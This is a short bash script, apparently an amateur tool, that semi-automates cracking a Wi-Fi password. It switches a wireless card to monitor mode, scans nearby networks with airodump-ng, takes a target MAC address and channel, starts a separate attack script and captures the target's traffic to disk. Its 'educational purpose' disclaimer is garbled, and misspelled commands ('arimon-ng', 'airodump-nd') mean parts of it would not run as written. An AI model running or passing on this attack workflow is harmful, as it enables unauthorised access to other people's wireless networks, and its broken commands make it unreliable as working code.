#!/bin/bash

echo "####################################################################"
echo "This is semi automate too to crack wifi pasoword."
echo "This tool should only be used for educational purpose."
echo "Disclaimer: If any person uses this too for illegal purpose I do hold responsibility for their act."
echo "#####################################################################"

iwconfig

read -p 'Select the wifi card: ' wificard

arimon-ng start $wificard

iwconfig

echo "The now is in monitor mode."

read -p 'Enter the name of the card in moitormode: ' moncard
export moncard
echo "The data that you are about to see is about the wifi surrounding you. Please press Ctrl+c aftera minute or so after the dump starts"

sleep 5s

airodump-ng $moncard

read -p 'Enter the MAC address of the wifi you want to crack: ' mac
export mac
read -p 'Enter the channel it is on: ' ch
export ch

gnome-terminal -x sh ./atc.sh

mkdir data
cd data

airodump-nd -w wep -c $ch --bssid $mac $moncard
